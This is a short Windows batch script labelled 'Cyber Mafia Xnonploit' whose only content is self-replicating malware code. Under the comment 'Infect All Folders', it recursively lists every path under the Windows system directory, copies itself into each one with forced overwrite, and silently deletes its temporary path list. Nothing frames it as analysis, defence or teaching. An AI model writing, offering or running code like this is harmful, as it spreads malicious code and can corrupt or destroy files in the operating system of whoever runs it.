:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Folders-----::
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
::---------------------------::
